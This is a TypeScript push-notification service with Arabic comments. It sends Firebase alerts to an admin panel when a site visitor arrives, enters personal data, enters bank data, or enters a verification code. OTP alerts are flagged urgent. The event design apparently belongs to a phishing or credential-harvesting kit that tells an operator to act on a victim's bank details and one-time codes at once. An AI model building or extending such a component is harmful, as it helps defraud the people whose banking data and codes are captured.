// Push Notifications Service - يعمل حتى مع إغلاق المتصفح
// يستخدم Firebase Cloud Messaging (FCM) لإرسال الإشعارات
import { db, trustedDevicesTable } from "@workspace/db";
import { eq } from "drizzle-orm";

// ─── أنواع الإشعارات ─────────────────────────────────────────────────────
export type NotificationEvent = "visitor" | "personal" | "bank" | "otp";

export interface PushPayload {
  title: string;
  body: string;
  icon?: string;
  badge?: string;
  tag?: string;
  sound?: string;
  data?: {
    eventType: NotificationEvent;
    sessionId?: string;
    applicantName?: string;
    url?: string;
    timestamp: number;
  };
}

// ─── إعدادات FCM من Environment ──────────────────────────────────────────
const FCM_SERVER_KEY = process.env.FCM_SERVER_KEY?.trim() || "";

// التحقق من إعدادات FCM
if (FCM_SERVER_KEY && FCM_SERVER_KEY.length > 50) {
  console.log("✅ [FCM] Server Key configured");
  console.log(`   Key length: ${FCM_SERVER_KEY.length}`);
} else {
  console.log("⚠️ [FCM] Server Key not configured or invalid");
  console.log("   FCM_SERVER_KEY:", FCM_SERVER_KEY ? `set (${FCM_SERVER_KEY.length} chars)` : "missing");
}

// ─── رسائل الإشعارات ────────────────────────────────────────────────────
const notificationMessages: Record<NotificationEvent, { title: string; body: string; sound?: string }> = {
  visitor: {
    title: "🆕 زائر جديد!",
    body: "زائر جديد دخل الموقع",
    sound: "default",
  },
  personal: {
    title: "👤 بيانات شخصية",
    body: "تم إدخال بيانات شخصية جديدة",
    sound: "default",
  },
  bank: {
    title: "🏦 بيانات البنك",
    body: "تم إدخال بيانات البنك - راجع الآن!",
    sound: "default",
  },
  otp: {
    title: "🔐 رمز تحقق!",
    body: "تم إدخال رمز التحقق - راجع الآن!",
    sound: "default",
  },
};

// ─── إرسال إشعار لجميع الأجهزة الموثوقة عبر FCM ──────────────────────────
export async function sendPushNotification(eventType: NotificationEvent, extraData?: { sessionId?: string; applicantName?: string }) {
  const message = notificationMessages[eventType];
  
  // تحديد لون الإشعار حسب النوع
  const eventColors: Record<NotificationEvent, string> = {
    visitor: "#10b981",   // أخضر
    personal: "#3b82f6",  // أزرق
    bank: "#f59e0b",      // برتقالي
    otp: "#ef4444",       // أحمر (عاجل)
  };

  const payload = {
    notification: {
      title: message.title,
      body: extraData?.applicantName 
        ? `${extraData.applicantName} - ${message.body}`
        : message.body,
      icon: "/icons/icon-512x512.png",
      badge: "/icons/badge-72.png",
      tag: `event-${eventType}`,
      color: eventColors[eventType],
      sound: "default",
      requireInteraction: eventType === "otp", // OTP يتطلب تفاعل
      vibrate: [200, 100, 200, 100, 200],
      dir: "rtl",
      lang: "ar",
      renotify: true,
      actions: [
        { action: "open", title: "📱 فتح لوحة الإدارة" },
        { action: "dismiss", title: "❌ تجاهل" },
      ],
    },
    data: {
      eventType,
      sessionId: extraData?.sessionId || "",
      applicantName: extraData?.applicantName || "",
      url: "/admin/visitors",
      timestamp: Date.now().toString(),
      click_action: "OPEN_ADMIN_DASHBOARD",
    },
    priority: eventType === "otp" ? "high" : "normal",
  };

  console.log(`📱 [FCM] Event: ${eventType}`);
  console.log(`📱 [FCM] Title: ${payload.notification.title}`);
  console.log(`📱 [FCM] Body: ${payload.notification.body}`);

  // ─── التحقق من إعدادات FCM ────────────────────────────────────────────
  if (!FCM_SERVER_KEY) {
    console.error("📱 [FCM] ❌ FCM Server Key not configured!");
    return { successful: 0, failed: 0, error: "FCM not configured" };
  }

  try {
    // ─── جلب الأجهزة الموثوقة ───────────────────────────────────────────
    const devices = await db
      .select()
      .from(trustedDevicesTable)
      .where(eq(trustedDevicesTable.isActive, true));

    const devicesWithPush = devices.filter(d => d.pushSubscription);

    if (devicesWithPush.length === 0) {
      console.log("📱 [FCM] No trusted devices with push subscriptions");
      return { successful: 0, failed: 0 };
    }

    console.log(`📱 [FCM] Sending to ${devicesWithPush.length} devices`);

    // ─── إرسال لجميع الأجهزة ─────────────────────────────────────────────
    const results = await Promise.allSettled(
      devicesWithPush.map(async (device) => {
        try {
          const subscriptionData = JSON.parse(device.pushSubscription!);
          
          // استخراج FCM Token من الـ subscription
          const fcmToken = extractFCMToken(subscriptionData.endpoint);
          
          if (!fcmToken) {
            console.error(`📱 [FCM] ❌ No FCM token for device: ${device.deviceId}`);
            throw new Error("No FCM token in subscription");
          }

          console.log(`📱 [FCM] Sending to device: ${device.deviceId}`);
          console.log(`📱 [FCM] Token: ${fcmToken.substring(0, 50)}...`);

          // ─── إرسال عبر FCM API ──────────────────────────────────────────
          const response = await fetch("https://fcm.googleapis.com/fcm/send", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Authorization": `key=${FCM_SERVER_KEY}`,
            },
            body: JSON.stringify({
              to: fcmToken,
              ...payload,
            }),
          });

          const responseText = await response.text();
          let responseData: any;
          try {
            responseData = JSON.parse(responseText);
          } catch {
            responseData = { raw: responseText };
          }

          console.log(`📱 [FCM] Response status: ${response.status}`);
          console.log(`📱 [FCM] Response: ${JSON.stringify(responseData).substring(0, 200)}`);

          if (!response.ok || responseData.failure === 1) {
            const errorMsg = responseData.results?.[0]?.error || `HTTP ${response.status}`;
            
            // معالجة الأخطاء الشائعة
            if (errorMsg === "UNREGISTERED" || errorMsg === "InvalidRegistration") {
              console.log(`📱 [FCM] Device unregistered, removing subscription`);
              await db
                .update(trustedDevicesTable)
                .set({ pushSubscription: null })
                .where(eq(trustedDevicesTable.id, device.id));
              throw new Error("Device unregistered from FCM");
            }
            
            throw new Error(`FCM error: ${errorMsg}`);
          }

          // ─── تحديث lastUsedAt ──────────────────────────────────────────
          await db
            .update(trustedDevicesTable)
            .set({ lastUsedAt: new Date() })
            .where(eq(trustedDevicesTable.id, device.id));

          console.log(`📱 [FCM] ✅ Success for device: ${device.deviceId}`);
          return { deviceId: device.deviceId, success: true, messageId: responseData.results?.[0]?.message_id };

        } catch (err) {
          const error = err as Error;
          console.error(`📱 [FCM] ❌ Failed for device ${device.deviceId}:`, error.message);
          return { deviceId: device.deviceId, success: false, error: error.message };
        }
      })
    );

    const successful = results.filter(r => r.status === "fulfilled" && (r.value as {success: boolean}).success).length;
    const failed = results.filter(r => !r.status || (r.status === "fulfilled" && !(r.value as {success: boolean}).success)).length;
    
    console.log(`📱 [FCM] Complete: ${successful} success, ${failed} failed`);
    
    return { successful, failed };
    
  } catch (err) {
    const error = err as Error;
    console.error("📱 [FCM] Fatal error:", error.message);
    return { successful: 0, failed: 0, error: error.message };
  }
}

// ─── استخراج FCM Token من Subscription Endpoint ─────────────────────────
function extractFCMToken(endpoint: string): string | null {
  if (!endpoint) return null;
  
  // FCM endpoint format: https://fcm.googleapis.com/fcm/send/[TOKEN]
  if (endpoint.includes("fcm.googleapis.com")) {
    const match = endpoint.match(/\/fcm\/send\/([A-Za-z0-9:_-]+)$/);
    if (match) {
      return match[1];
    }
    // إذا كان الـ endpoint هو الـ token مباشرة
    return endpoint;
  }
  
  // إذا كان endpoint عادي
  return endpoint;
}

// ─── للتوافق مع الكود القديم ──────────────────────────────────────────────
export function saveSubscription(endpoint: string, sub: any) {
  console.log(`📱 [FCM] New subscription saved`);
  console.log(`📱 [FCM] Endpoint: ${endpoint?.substring(0, 80)}...`);
}

export function removeSubscription(endpoint: string) {
  console.log(`📱 [FCM] Remove subscription: ${endpoint?.substring(0, 50)}...`);
}

// تصدير للتحقق
export function isFCMConfigured(): boolean {
  return Boolean(FCM_SERVER_KEY && FCM_SERVER_KEY.length > 50);
}
